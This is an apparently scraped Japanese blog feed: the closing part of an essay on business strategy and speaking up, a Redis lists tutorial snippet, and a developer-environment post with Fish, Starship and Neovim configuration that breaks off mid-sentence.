中でしか、身につかない。経営は、科学ではない。人に依る。どれだけ理論を学んでも、どれだけデータを分析しても、最後は人の判断だ。その人が、どう見るか。どう感じるか。どう決めるか。そして、その判断は、再現性が低い。同じ状況でも、違う人なら、違う判断をする。同じ人でも、違うタイミングなら、違う判断をする。だから、経営には「正解」がない。あるのは、「その時、その人が、最善だと信じた選択」だけだ。これは、不安だ。頼りない。でも、これが現実だ。戦略を語る人は、多い。でも、戦略を作る人は、少ない。戦略を作ることは、快適ではないからだ。答えのない問いと向き合う。対立を引き受ける。リスクを負う。責任を取る。だからこそ、「語れ」と言いたい。しかし、責任を持って。美しい言葉を並べるだけではなく。フレームワークを使って終わりではなく。スライドを作って満足するのではなく。本当の戦略は、もっと地味だ。もっと泥臭い。現場を見る。数字を見る。人と話す。何度も考える。何度も見直す。何度も修正する。そして、決める。やると決める。やらないと決める。これが、戦略だ。企業全体の戦略を作ることは、私にはできない。立場が違う。責任の範囲が違う。でも、自分の責任範囲では、できる。そして、それで十分だ。小さな範囲でも、根っこは同じだからだ。問題を見極める。解決策を見つける。選択する。実行する。これができれば、それは戦略だ。私自身、最近やったことがある。自分の「責任範囲」で、今週中にやめると決められることを1つだけ、紙に書き出した。それをやめることで、どんなリソースが解放されるか考えた。そして、「戦略」という言葉を使わずに、これから1年の方針を「問題→選択→行動」の3行で書いてみた。書けた時、少しだけ、戦略を作る側に立てた気がした。そして、もう1つ。声に出すことの価値について。私は長いあいだ、「立場を超えて意見するのは越権行為だ」と思っていた。技術顧問は技術のことだけ言えばいい。経営戦略に口を出すのは筋違いだ。そう思っていた。でも、最近は少し考えが変わった。黙っていても、組織が良くなることはない。「これ、おかしいのではないか」と感じた時、黙っていれば波風が立たない。ただ、波風を立てないことと、組織を良くすることは別だ。誰かが声を上げなければ、おかしいことはおかしいままだ。もちろん、声の上げ方は重要だ。対立を煽る言い方ではなく、建設的な問いかけとして。「これは戦略ですか」と詰問するのではなく、「この戦略で解決したい最重要課題は何ですか」と問う。相手を追い詰めるのではなく、一緒に考える姿勢で。「おい、戦略を語れ」。このタイトルには、怒りがある。「おい」という呼びかけには、苛立ちがある。会議で空虚な戦略を語る人たちへの怒り。それもある。しかし、正直に言えば、怒りの多くは自分に向いている。かつての自分も、同じことをしていたから。今でも、完璧にはできていないから。「戦略を語れ」と他人に言いながら、自分は語れているのか。この怒りの裏には、期待がある。もっとうまくやれるはずだ、という期待。自分に対しても、組織に対しても。その期待が裏切られるたびに、怒りが生まれる。そして、その怒りを誰かにぶつけたくなる。「おい、戦略を語れ」と。しかし、怒りだけでは何も変わらない。怒りを、行動に変えなければならない。自分の責任範囲で、選択し続けること。声を上げ続けること。それが、怒りを建設的なものに変える唯一の方法だ。だから、この言葉は、他人に向けているようで、実は自分に向けている。お前は本当に戦略を語れているのか。中身のない言葉を並べていないか。選択から逃げていないか。そう自分に問いかけている。でも同時に、この言葉は、外に向けても発したい。会議で空虚な「戦略」が語られている時。誰もがうなずいているけれど、誰も本当には信じていない時。そういう時に、「それは本当に戦略ですか」と問いかける勇気を持ちたい。声を上げることは、リスクだ。嫌われるだろう。場の空気を壊すだろう。「余計なことを言う奴」と思われるだろう。それでも、本当に重要なことは、声に出さなければ伝わらない。心の中で思っているだけでは、何も変わらない。自分の責任範囲で戦略を実践すること。そして、必要な時には、声を上げること。この2つが揃って、初めて「戦略を語れ」というタイトルに応えられる気がする。「それだけ」の難しさ結局、戦略とは何なのか。長々と書いてきたが、煎じ詰めれば、やるべきことはシンプルだ。核心的な課題を見極めているか、確認する。その課題を本当に解決できているか、問い続ける。妥協なく、選択と集中ができているか、点検する。うまくいっていないなら、うまくいきそうな方に舵を切る。それだけだ。こう書くと、「そんなの当然だ」と感じるだろう。しかし、自分の仕事を振り返ってみてほしい。本当にこれができているだろうか。「課題を見極めているか」を確認するとは、自分たちの判断を直視することだ。これは、自分たちの見立て違いや判断ミスと向き合うことでもある。誰だって、自分が間違っていたとは認めたくない。だから、別の指標を見てしまう。納期に間に合ったか、予算内に収まったか、上司に怒られなかったか。「核心を突けているか」ではなく、「うまくやり過ごせているか」を見てしまう。仕事をしていると、いつの間にか「課題を解決する」という目的が薄れていく。たとえば、内部開発者プラットフォームの構築プロジェクト。最初は「開発者の生産性を上げる」という明確な目的があったはずだ。しかし、プロジェクトが進むにつれて、目的は変質していく。「Kubernetesクラスタを予定通りに構築する」「監視ツールを導入する」「経営層への報告をうまくまとめる」。気づけば、開発者が本当に使いやすいかどうかより、プロジェクトとして「成功」と言えるかどうかが関心事になっている。「課題を解決しているか」という問いは、常に意識しないと蒸発してしまう。なぜなら、その問いに向き合うのは苦しいからだ。解決できていないという不安と向き合わなければならない。「妥協なく」という言葉も、簡単ではない。妥協は悪意からではなく、善意や現実主義から生まれる。「この機能、完璧ではないけど、ないよりましだろう」「全員が満足するものを作れないから、ある程度のところで折り合いをつけよう」「理想を追求していたら、いつまでも終わらない」。一見、成熟した判断に見える。しかし、この「妥協」が積み重なると、最後に出来上がるものが「そこそこ」になる。誰も強く不満を言わないが、強く満足する人もいない。一応使えるが、積極的に使いたいとは思わない。「そこそこ」は、失敗より危険だ。失敗は直せる。「そこそこ」は直せない。明らかな失敗なら、原因を追求して改善できる。しかし「そこそこ」は改善の動機を奪う。「一応は使われている」「致命的な問題はない」という状態は、変化への意欲を殺す。その状態が何年も続いた先に、誰も欲しがらないが捨てることもできない、ゾンビのようなプロダクトやサービスが生まれる。「うまくいっていないなら、舵を切る」。この言葉の中で、最も実行が難しいのはこの部分だろう。まず、「うまくいっていない」と認めることが難しい。これまでの努力を否定することになるからだ。「方向性は間違っていないが、やり方に問題があった」「もう少し続ければ成果が出る」と思いたい。次に、「うまくいきそうな方向」を見つけることが難しい。うまくいっていないことは分かっても、代わりにどうすればいいかは分からない。だから、現状維持を選んでしまう。少なくとも、今のやり方なら「最悪ではない」ことは分かっている。未知の方向に舵を切るのは、博打に見える。では、この「それだけ」を実践するには何が必要なのか。目的を見失わない仕組み。日常の作業に埋没すると、なぜこれをやっているのかを忘れる。定期的に、しかも形式的にではなく真剣に、「何のためにやっているのか」を問い直す機会が必要だ。週に一度でも、チームで「これは本当に問題を解決しているか」と話し合う。その習慣があるかないかで、結果は大きく変わる。小さく試す文化。大きな賭けは、舵を切りにくくする。三年かけて作ったものを「やっぱりダメでした」とは言いにくい。しかし、二週間で作ったものなら、「これは違った、次を試そう」と言える。小さく作り、早く確認し、素早く方向修正する。このサイクルを速く回せる環境があれば、舵取りは格段に楽になる。失敗を許容する空気。「うまくいっていない」と言えるかどうかは、それを言った時に何が起こるかで決まる。責められるなら、誰も言わない。隠す。ごまかす。「うまくいっていない」という報告が、責任追及ではなく改善の起点として扱われる組織でなければ、正直な確認はできない。判断の軸を持つこと。舵を切る方向を決めるには、判断の軸が必要だ。「顧客の困りごとを減らす」「使う人の時間を節約する」「この体験を心地よくする」。何でもいい、しかし具体的で、検証可能な軸。それがあれば、「こっちの方がうまくいくだろう」という仮説を立てられる。軸がなければ、どこに舵を切っていいか分からない。「それだけ」という言葉は、謙遜ではない。本当に、やるべきことはそれだけなのだ。作れているかを見る。問題を解決しているかを問う。妥協しない。確認し続ける。必要なら方向を変える。しかし、この「それだけ」を本当に実践している組織やチームや個人は驚くほど少ない。私たちは目的を忘れ、妥協に流され、現実から目を逸らし、変化を恐れる。「それだけ」の中に、ものづくりの、いや、あらゆる仕事の核心がある。そして、その核心を貫くことの難しさと向き合い続けることが、良い仕事をするということなのだろう。おわりにここまで読んでしまった人がいるとしたら、申し訳ない気持ちが少しある。この文章を読んでも、明日から「戦略が立てられる人」にはならない。私自身がそうだったから分かる。本を読んだ直後は「分かった」と思う。会議で使えそうなフレーズをいくつかメモする。「核心的な課題を見極める」「何をやらないかを決める」。いい言葉だ。これを使えば、自分も戦略を語れる側の人間になれる気がする。でも翌週、いざ自分の仕事で使おうとすると手が止まる。「で、何から始めるんだっけ」。頭の中でフレーズは踊っているのに、目の前の仕事にどう適用すればいいか分からない。結局、また賢そうな顔をして会議に座っている。何も変わっていない。たぶん、戦略を立てる力は、戦略を立てることでしか身につかない。走り方の本を読んでも走れるようにならないのと同じだ。転んで、膝を擦りむいて、また走る。そうやってしか身につかない。身も蓋もないけど、そうとしか言いようがない。だから、この文章には限界がある。読んだだけでは何も変わらない。でも、もしかしたら、何かが引っかかるかもしれない。次の会議で「戦略」という言葉を聞いた時、「それ、本当に戦略？」と心の中でツッコめるようになったら、それだけで意味がある。自分のチームの方向性を考える時に「で、何を捨てるの？」という問いが頭をよぎるようになったら、それで十分だ。その小さな引っかかりが、いつか行動に変わるかもしれない。変わらないかもしれない。でも、引っかかりがなければ、変わる可能性すらない。正直に言えば、この文章は誰かのためというより、自分のために書いた。書きながら「お前、分かってないじゃん」と何度も思った。調べれば調べるほど、自分の理解の浅さが見えてくる。偉そうに「戦略とは何か」を語っているけど、じゃあお前は実践できているのか。そう問われたら、黙るしかない。「おい、戦略を語れ」という怒りは、他人への苛立ちではなかった。鏡に映った自分への問いかけだった。語れているのか。実行できているのか。逃げていないか。分かったふりを続けていないか。その問いに、まだ答えられていない。明日も会議がある。誰かが「戦略」と言うだろう。私はまた、眉間にしわを寄せて「なるほど」という顔をするだろう。それは変わらない。でも、今度は少しだけ、違う気持ちで聞けるかもしれない。「それ、本当に戦略？」と心の中で問いかけながら。その問いかけは、きっと会議室の誰かにではなく、自分自身に向けられている。そう思えるだけで、この長い文章を書いた甲斐はあった。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。参考書籍ストーリーとしての競争戦略 Hitotsubashi Business Review Books作者:楠木 建東洋経済新報社Amazon戦略の要諦 (日本経済新聞出版)作者:リチャード・Ｐ・ルメルト日経BPAmazon「暗記する」戦略思考　「唱えるだけで」深く、面白い「解」を作り出す破壊的なコンサル思考【電子限定特典付】作者:高松智史かんき出版AmazonArchitecture Modernization: Socio-technical alignment of software, strategy, and structure (English Edition)作者:Tune, Nick,Perrin, Jean-GeorgesManningAmazonプラットフォームエンジニアリング ―成功するプラットフォームとチームを作るガイドライン作者:Camille Fournier,Ian Nowland,松浦 隼人（翻訳）オーム社AmazonKubernetesで実践する Platform Engineering作者:Mauricio Salatino翔泳社Amazonジョブ理論　イノベーションを予測可能にする消費のメカニズム作者:クレイトン・Ｍ・クリステンセンHarperCollinsAmazonイノベーションの経済学　「繁栄のパラドクス」に学ぶ巨大市場の創り方作者:クレイトン・Ｍ・クリステンセンHarperCollinsAmazonイノベーションのジレンマ 増補改訂版 Harvard business school press作者:Clayton M. Christensen翔泳社Amazon【Amazon.co.jp 限定】戦略のデザイン ゼロから「勝ち筋」を導き出す10の問い（ダウンロード特典：『戦略デザイン力』セルフ診断シート データ配信）: ゼロから「勝ち筋」を導き出す１０の問い作者:坂田 幸樹ダイヤモンド社Amazon良い戦略、悪い戦略 (日本経済新聞出版)作者:リチャード・Ｐ・ルメルト日経BPAmazon君は戦略を立てることができるか 視点と考え方を実感する４時間作者:音部大輔Amazon戦略的思考とは何か 改版 (中公新書 700)作者:岡崎 久彦中央公論新社Amazon戦略、組織、そしてシステム: 「組み立てる」戦略思考の方法論作者:横山　禎徳東洋経済新報社Amazon","isoDate":"2025-12-15T04:00:00.000Z","dateMiliSeconds":1765771200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"初心で挑むredis入門 ~Redis lists編~","link":"https://zenn.dev/akasan/articles/redis_data_list","contentSnippet":"今回はredisで使えるlistsについてみていきます。先日公開したHashesについてもぜひご覧ください。https://zenn.dev/akasan/articles/redis_data_hash 早速検証redisの環境構築については先日公開した以下の記事を参考にしてください。https://zenn.dev/akasan/articles/redis_quickstartRedis listsのドキュメントは以下になります。https://redis.io/docs/latest/develop/data-types/lists/#performance ス...","isoDate":"2025-12-14T09:21:41.000Z","dateMiliSeconds":1765704101000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"2025年版 PDE（Personal Development Environment）のすすめ：自分だけの刀を打つ開発環境構築","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/14/132552","contentSnippet":"この記事は、Vim Advent Calendar 2025 13日目のエントリ記事です。はじめにVSCodeやJetBrains製品は、膨大な開発リソースを投じて作られた最強の武器だ。補完、デバッグ、Git統合、拡張機能——すべてが高度に洗練されている。多くの開発者にとって、これらを選ぶのは賢明な判断だと思う。それでも、私は自分で刀を打ちたい。ただし、誤解のないように言っておくと、名刀を打ちたいわけではない。美術館に飾られるような、完璧な一振りを目指しているわけではない。私が欲しいのは、戦場で戦うための道具だ。多少キズがあってもいい。見栄えが悪くてもいい。自分の手に馴染んで、明日の仕事で使えればそれでいい。では、なぜ自分で作るのか。正直に言えば、効率の問題ではない。もっと根本的な、性分の問題だ。思い返すと、私は子供の頃から構造や仕組みがどうしても気になって、分解してしまうクセがあった。おもちゃ、家電、何でも中がどうなっているか知りたくなる。そして仕組みを理解したら、自分なりに改修して「自分だけのもの」を作りたくなる。完成品を受け取るより、自分で手を入れる余地があるものに惹かれる。開発環境も同じだ。私は元々Vimユーザーで、その後Neovimに移行した。途中でVSCode、JetBrains、Cursorに浮気したこともある。どれも素晴らしいツールだった。だが、どうしても「自分で鍛えている」という感覚がなかった。「自分のもの」という実感が湧かなかった。具体的に言うと、こういうことだ。VSCodeを使っていたとき、settings.jsonをいじり、拡張機能を入れ替え、キーバインドを変え——気づけば「VSCodeをカスタマイズする」こと自体が目的になっていた。ならば、最初からカスタマイズ前提のツールを使えばいい。そう考えてNeovimに戻った。理由を論理的に説明するのは難しい。効率だけで言えば、IDEを使いこなす方が早いかもしれない。それでも、自分の手で環境を組み上げ、日々磨き、少しずつ自分の形に変えていく。その過程そのものに惹かれている。これは性分だ。こうした考え方には、実は名前がある。PDE（Personal Development Environment）——「個人開発環境」だ。自分のワークフローに最適化された、自分だけの開発環境を指す。私が10年かけてやってきたことは、まさにこのPDEの構築だった。この記事では、2025年現在の私のPDE構成を紹介する。Rust、Go、TypeScript、Pythonでの開発、そしてKubernetesやTerraformを使ったインフラ作業を想定した構成だ。IDEが合う人にはIDEを勧める。でも、もし「自分で作ってみたい」という気持ちがあるなら、この記事が参考になれば嬉しい。PDEとIDEの違いIDEは万人向けに最適化されており、インストール直後から高い生産性が得られる。学習曲線は緩やか、メンテナンスはベンダー任せ。一方PDEは個人最適化の代わりに、学習コストとメンテナンスを自分で負担する。どちらが優れているかではなく、「すぐ使える便利さ」と「自分で作る楽しさ」のトレードオフだ。もちろん、IDEにも自分の設定を入れられることは知っている。キーバインドを変更できるし、拡張機能は豊富だし、自分でプラグインを開発できる。VSCodeのsettings.jsonを何百行も書いた。それでも、私には「自分で作っている」という実感が足りなかった。論理的に説明するのは難しい。ただ、その実感の有無が、私にとっては大きかった。では、PDEとは結局何なのか。PDEの本質は「自分の手に馴染む道具を自分で作る」こと。職人が道具を磨くように、開発者も環境を育てていく。ただし、職人の道具は飾るためではなく使うためにある。PDEも同じだ。完璧な環境を作ることが目的ではなく、日々の開発で戦えることが目的だ。効率だけを求めるなら、IDEを使った方がいい場面も多い。私のPDE構成概要基盤はWarp Terminal。その上でFish Shellを動かし、プロンプトにはStarshipを使っている。エディタはNeovim（NvChadベース）で、LSPとTreesitterで補完とシンタックスハイライトを実現している。CLIツールはUnixの古典を現代版に置き換えた。lsの代わりにeza、catの代わりにbat、grepの代わりにripgrep。ディレクトリ移動はzoxide、リポジトリ管理はghq + fzf、差分表示はdeltaを使っている。AIアシスタントは複数導入しているが、主軸はClaude Code。Neovim内ではCopilotとAvanteも使っている。1. ターミナル：Warpwww.warp.devかつてはtmux + iTerm2の組み合わせを使っていた。しかし2024年、Warpに移行した。tmuxでやりたかったこと（ペイン分割、セッション管理）がWarp単体でできるし、見た目もかっこいい。使っていて特に不満もない。正直なところ、tmuxの設定をメンテナンスするのが面倒になっていた。tmux + Bash時代は.tmux.confが600行を超えていて、何がどう動いているのか自分でも把握しきれなくなっていた。現在はWarp + Fishという構成で、tmuxの設定は丸ごと不要になった。設定ファイルが減るのは精神衛生上とても良い。あと、Warpはモダンなターミナルらしく、補完がよく効く。コマンドを途中まで打つと候補が出てくる。tmux時代は「あのコマンドなんだっけ」とhistoryを漁ることが多かったが、その頻度が減った。気に入っている点ブロックベースの出力: コマンドの出力が独立したブロックとして扱われ、コピーや再利用が容易。長いログの一部だけコピーしたいときに便利セッション管理の内蔵: tmuxのペイン分割・セッション管理相当の機能が標準搭載。tmuxのプレフィックスキーを覚えなくていいAIアシスタント: 自然言語でコマンドを生成できる。正直あまり使っていないが、たまに「あのコマンドなんだっけ」というときに便利見た目: 単純にかっこいい。毎日使うものなので、見た目の満足度は意外と大事設定のポイント# ~/.warp/keybindings.yamlkeybindings:  # Vim風のペインナビゲーション  - command: move_focus_to_left_pane    keys: ctrl-h  - command: move_focus_to_right_pane    keys: ctrl-l  - command: move_focus_to_pane_above    keys: ctrl-k  - command: move_focus_to_pane_below    keys: ctrl-jtmuxの設定をメンテナンスする必要がなくなったのは大きい。.tmux.confの600行が不要になった。2. シェル：Fish Shellfishshell.comBashやZshではなくFishを選んだ理由は明確だ。設定なしで賢い。「それならIDEを使えばいいのでは」と思うかもしれないが、シェルは基盤だ。基盤が安定しているからこそ、その上で動くエディタやツールを自由にカスタマイズできる。すべてを自分で作る必要はない。Fish選択の決め手補完がすごい: 設定なしでコマンド履歴、ファイルパス、オプションを補完シンタックスハイライト: コマンド入力中にエラーが分かる設定の簡潔さ: ZshからFishに移行して、設定行数が600行から400行に減ったモダンCLIツール統合Unixの古典的コマンドを現代版に置き換えている。# ~/.config/fish/config.fish# ls → eza (icons + git status)if type -q eza    function ls --wraps eza        eza --icons --group-directories-first $argv    endend# cat → bat (syntax highlighting)if type -q bat    function cat --wraps bat        bat --paging=never $argv    endend# grep → ripgrep (faster + smarter)if type -q rg    function grep --wraps rg        rg $argv    endendgithub.comgithub.comgithub.com省略形（abbr）Fishにはabbr（abbreviation、省略形）という機能がある。入力してスペースを押すと、その場で展開される。# ~/.config/fish/config.fish# Git省略形abbr -a g gitabbr -a ga \\"git add\\"abbr -a gc \\"git commit\\"abbr -a gco \\"git checkout\\"abbr -a gd \\"git diff\\"abbr -a gp \\"git push\\"abbr -a gl \\"git pull\\"abbr -a gs \\"git status\\"abbr -a glog \\"git log --oneline --graph\\"# Docker省略形abbr -a d dockerabbr -a dc \\"docker compose\\"abbr -a dcu \\"docker compose up -d\\"abbr -a dcd \\"docker compose down\\"abbr -a dps \\"docker ps\\"# Kubernetes省略形abbr -a k kubectlabbr -a kgp \\"kubectl get pods\\"abbr -a kgs \\"kubectl get svc\\"abbr -a kgd \\"kubectl get deploy\\"abbr -a kd \\"kubectl describe\\"abbr -a kl \\"kubectl logs\\"abbr -a kex \\"kubectl exec -it\\"gsと入力してスペースを押すとgit statusに展開される。私がabbrを気に入っている理由は、展開後のコマンドが履歴に残ること、そして展開後に編集できることだ。Gitコマンドを1日に数十回打つ私にとって、この小さな省力化の積み重ねは大きい。ディレクトリ移動の革命：zoxidecdコマンドをzoxideで置き換えた。一度訪れたディレクトリは、部分一致でジャンプできる。# zoxideの有効化if type -q zoxide    zoxide init fish --cmd z | sourceend# 例：~/ghq/github.com/nwiizo/projectに移動z project  # これだけでOKgithub.comghq + fzf によるリポジトリ管理全てのリポジトリをghqで管理し、fzfで瞬時に移動する。function ghq_fzf_repo -d \\"Select repository with fzf\\"    set -l selected (ghq list -p | fzf \\\\        --prompt=\\"Repository: \\" \\\\        --preview=\'ls -la {}\')    if test -n \\"$selected\\"        cd $selected    endend# Ctrl+G でリポジトリ選択bind \\\\cg ghq_fzf_repogithub.comdirenv による環境の自動切り替えプロジェクトごとの環境変数を.envrcで管理。ディレクトリに入ると自動で読み込まれる。# direnvの有効化（2025年現在のベストプラクティス）if type -q direnv    set -g direnv_fish_mode eval_on_arrow    direnv hook fish | sourceenddirenv.net3. プロンプト：Starshipstarship.rsStarshipは、Rustで書かれた高速なクロスシェルプロンプト。Git状態、言語バージョン、クラウド環境を一目で確認できる。# ~/.config/starship.tomlformat = \\"\\"\\"$directory\\\\$git_branch\\\\$git_status\\\\$golang\\\\$rust\\\\$python\\\\$kubernetes\\\\$cmd_duration\\\\$line_break\\\\$character\\"\\"\\"[character]success_symbol = \\"[❯](bold green)\\"error_symbol = \\"[❯](bold red)\\"[kubernetes]symbol = \\"☸ \\"disabled = falseKubernetes contextが常に表示されるので、本番環境で作業しているか一目で分かる。これで何度か事故を防げた。4. エディタ：Neovim + NvChadneovim.ionvchad.comVim/Neovimを使い始めて10年以上になる。途中でVSCode、JetBrains、Cursorを試したこともあるが、どれも1ヶ月以上メインに居座ったことはない。併用はしても、結局Neovimに戻ってきた。VSCodeもJetBrainsも素晴らしいエディタで、今でもそう思っている。ただ、私は自分で環境を組み立てたかった。その欲求が、他のエディタでは満たされなかった。2025年版 Minimal UI アーキテクチャ2025年の私のNeovim設定で最も特徴的なのは、statusline-less workflowだ。従来のstatuslineやtabuflineを廃止し、必要な情報のみをfloating windowで表示する。編集領域を最大化しつつ、必要な情報は失わない。 コンポーネント  プラグイン  役割  ファイル情報  incline.nvim  右下floating statusline  モード表示  modes.nvim  cursorline色でモード表示  コマンドライン  noice.nvim  floating cmdline (cmdheight=0)  バッファ薄暗化  vimade  非アクティブバッファをdim  コードピーク  overlook.nvim  LSP定義をstackable popup表示  ファイル選択  Snacks.nvim  smart pickerでbufferline代替 github.comincline.nvimは画面右下に小さなfloating windowでファイル情報を表示する。ファイルアイコン、ファイル名、未保存マーク、診断数が一目で分かる。init.luaのような汎用的なファイル名の場合は親ディレクトリも表示される（plugins/init.luaのように）。github.commodes.nvimはInsert/Visual/Deleteなどのモードをcursorlineの色で表現する。Insertはシアン、Visualは紫、Deleteは赤。-- INSERT --のようなテキスト表示が不要になり、視覚的に直感的。-- options.lua での設定vim.o.cmdheight = 0      -- コマンドライン非表示（noice.nvimが代替）vim.o.laststatus = 0     -- statusline非表示（incline.nvimが代替）vim.o.showmode = false   -- モード表示非表示（modes.nvimが代替）キーマップの発見性：which-key.nvimgithub.com2025年のNeovim設定で欠かせないのがwhich-key.nvimだ。キーを押すと、次に押せるキーの一覧がポップアップで表示される。「あのキーマップなんだったっけ」という問題が解消される。{  \\"folke/which-key.nvim\\",  opts = {    preset = \\"helix\\",    spec = {      { \\"<leader>a\\", group = \\"AI\\" },      { \\"<leader>g\\", group = \\"Git\\" },      { \\"<leader>s\\", group = \\"Search\\" },      { \\"<leader>x\\", group = \\"Diagnostics\\" },    },  },  keys = {    { \\"<leader>?\\", function() require(\\"which-key\\").show() end, desc = \\"Buffer Keymaps\\" },  },}<leader>を押して少し待つと、aでAI、gでGit、sでSearch...とグループ分けされたキーマップが表示される。新しいプラグインを入れてもキーマップを覚える必要がない。ナビゲーションSnacks.nvim - 2025年のモダンユーティリティ集。github.comSnacks.nvimはfolke氏による新しいプラグインで、picker、lazygit統合、buffer削除などを統合している。特にsmart pickerが便利で、ファイル・バッファ・最近使用したファイルを一つのインターフェースで検索できる。{  \\"folke/snacks.nvim\\",  keys = {    { \\"<leader><leader>\\", function() Snacks.picker.smart() end, desc = \\"Smart Picker\\" },    { \\"<leader>gg\\", function() Snacks.lazygit.open() end, desc = \\"LazyGit\\" },    { \\"<leader>sf\\", function() Snacks.picker.files() end, desc = \\"Find Files\\" },    { \\"<leader>sg\\", function() Snacks.picker.grep() end, desc = \\"Grep\\" },  },}lazygit統合ではeditPreset = \\"nvim-remote\\"を設定することで、lazygit内でファイルを開くと現在のNeovimインスタンスで開かれる。別ウィンドウが立ち上がらない。Telescope - 検索のハブ（サブとして併用）。github.com{  \\"nvim-telescope/telescope.nvim\\",  keys = {    { \\"<leader>ff\\", \\"<cmd>Telescope find_files<cr>\\", desc = \\"Find Files\\" },    { \\"<leader>fg\\", \\"<cmd>Telescope live_grep<cr>\\", desc = \\"Live Grep\\" },    { \\"<C-p>\\", \\"<cmd>Telescope find_files<cr>\\", desc = \\"Find Files\\" },  },}oil.nvim - ファイルシステムをバッファとして編集。github.comneo-treeのようなツリー表示ではなく、ファイルシステムを通常のバッファとして扱う。ファイル名の変更は行の編集、削除は行の削除。Vimユーザーには直感的。{  \\"stevearc/oil.nvim\\",  keys = {    { \\"-\\", \\"<cmd>Oil<cr>\\", desc = \\"Open parent directory\\" },  },}flash.nvim - 画面内の任意の位置にジャンプ。github.comsを押して文字を入力すると、その文字にラベルが表示される。ラベルを押すとジャンプ。hop.nvimの後継で、メンテナンスも活発。overlook.nvim - コードピーク。github.comLSPの定義をfloating popupで表示する。ファイルを開かずに定義を確認できる。popupはスタック可能で、複数の定義を同時に表示できる。{  \\"WilliamHsieh/overlook.nvim\\",  keys = {    { \\"<leader>pd\\", function() require(\\"overlook\\").open_definition() end, desc = \\"Peek Definition\\" },    { \\"<leader>pc\\", function() require(\\"overlook\\").close_all() end, desc = \\"Close All Popups\\" },  },}診断・デバッグtrouble.nvim v3 - 診断情報のUI。github.com2024年にv3として完全書き直しされた。ツリービュー対応で、エラーの階層構造が見やすい。{  \\"folke/trouble.nvim\\",  keys = {    { \\"<leader>xx\\", \\"<cmd>Trouble diagnostics toggle<cr>\\" },    { \\"<leader>xX\\", \\"<cmd>Trouble diagnostics toggle filter.buf=0<cr>\\" },    { \\"<leader>xs\\", \\"<cmd>Trouble symbols toggle<cr>\\" },  },}todo-comments.nvim - TODO/FIXME/NOTEのハイライト。コード内のTODOコメントを自動検出してハイライト。Telescopeと連携してプロジェクト全体のTODOを一覧表示できる。Git統合gitsigns.nvim - インラインGit情報。github.com変更行の横にサイン（│）が表示される。hunk単位でのステージ、リセット、プレビューが可能。{  \\"lewis6991/gitsigns.nvim\\",  opts = {    on_attach = function(bufnr)      local gs = package.loaded.gitsigns      vim.keymap.set(\\"n\\", \\"]c\\", gs.next_hunk, { buffer = bufnr, desc = \\"Next Hunk\\" })      vim.keymap.set(\\"n\\", \\"[c\\", gs.prev_hunk, { buffer = bufnr, desc = \\"Prev Hunk\\" })      vim.keymap.set(\\"n\\", \\"<leader>gp\\", gs.preview_hunk, { buffer = bufnr, desc = \\"Preview Hunk\\" })      vim.keymap.set(\\"n\\", \\"<leader>gb\\", function() gs.blame_line { full = true } end, { buffer = bufnr, desc = \\"Blame Line\\" })    end,  },}diffview.nvim - Git diffの可視化。github.comGit差分をNeovim内で確認できる。ファイル履歴も見やすい。2025年版では、より多くのキーマップを設定している。{  \\"sindrets/diffview.nvim\\",  keys = {    { \\"<leader>gd\\", \\"<cmd>DiffviewOpen<cr>\\", desc = \\"Git Diff (working tree)\\" },    { \\"<leader>gD\\", \\"<cmd>DiffviewOpen HEAD~1<cr>\\", desc = \\"Diff vs previous commit\\" },    { \\"<leader>gh\\", \\"<cmd>DiffviewFileHistory %<cr>\\", desc = \\"File History\\" },    { \\"<leader>gH\\", \\"<cmd>DiffviewFileHistory<cr>\\", desc = \\"Branch History\\" },    { \\"<leader>gm\\", \\"<cmd>DiffviewOpen main...HEAD<cr>\\", desc = \\"Diff vs main branch\\" },    { \\"<leader>gs\\", \\"<cmd>DiffviewOpen --staged<cr>\\", desc = \\"Staged changes\\" },    { \\"<leader>gq\\", \\"<cmd>DiffviewClose<cr>\\", desc = \\"Close Diffview\\" },  },}Diffview内では-でステージ/アンステージ、Sで全てステージ、Xで変更を復元。コンフリクト解決も<leader>co（ours）、<leader>ct（theirs）で直感的に操作できる。LSP設定Mason.nvimで言語サーバーを管理。主要な言語はすべてカバー。ensure_installed = {  -- Rust  \\"rust-analyzer\\",  -- Go  \\"gopls\\", \\"gofumpt\\", \\"goimports\\",  -- TypeScript/JavaScript  \\"typescript-language-server\\", \\"prettier\\",  -- Python  \\"pyright\\", \\"black\\", \\"isort\\",  -- Infrastructure  \\"terraform-ls\\", \\"yaml-language-server\\",  -- Shell  \\"bash-language-server\\", \\"shellcheck\\",}2025年のポイントとして、JSON/YAMLにはSchemaStoreを統合している。package.jsonやdocker-compose.ymlの補完がスキーマベースで効くようになる。github.com5. AIアシスタント統合2024年から2025年にかけて、開発環境で最も大きく変わったのはAIの存在だ。コード補完、生成、レビュー、デバッグ——あらゆる場面でAIが介在するようになった。2025年のPDEにおいて、AIツールは最も重要な要素になっている。私は複数のAIツールを導入しているが、主軸はClaude Codeだ。Claude Code - 開発の中心docs.anthropic.comターミナルで起動し、コード生成、リファクタリング、デバッグ、質問——ほとんどの作業をClaude Codeで完結させている。私の使い方の特徴は、プロジェクトごとにカスタマイズしている点だ。やっていることはシンプルで、3つのファイルを育て続けている。project/├── CLAUDE.md              # プロジェクト固有の指示├── .claude/│   ├── commands/          # カスタムスラッシュコマンド│   │   ├── review.md│   │   └── test.md│   └── agents/            # 特化型エージェント│       └── reviewer.mdCLAUDE.md にはプロジェクトの文脈を書く。使用技術、コーディング規約、避けるべきパターンなど。これがあるとClaude Codeの回答精度が劇的に上がる。commands にはよく使う操作をスラッシュコマンドとして定義する。/reviewでコードレビュー、/testでテスト生成など。毎回同じプロンプトを書く手間が省ける。agents には特定タスクに特化したエージェントを定義する。レビュー専門、リファクタリング専門など、役割を分けることで精度が上がる。重要なのは、これらを使いながら修正し続けること。「この指示だと意図と違う結果になる」と気づいたらCLAUDE.mdを更新する。コマンドの出力が物足りなければcommandを調整する。PDEと同じで、日々の開発の中で育てていく。Neovimとの連携にはclaude-code.nvimを使っている。github.com{  \\"greggh/claude-code.nvim\\",  keys = {    { \\"<leader>cc\\", \\"<cmd>ClaudeCode<cr>\\", desc = \\"Claude Code\\" },    { \\"<leader>cr\\", \\"<cmd>ClaudeCodeResume<cr>\\", desc = \\"Resume Conversation\\" },  },}<leader>ccでClaude Codeのターミナルウィンドウをトグル。エディタで開いているファイルをそのままClaude 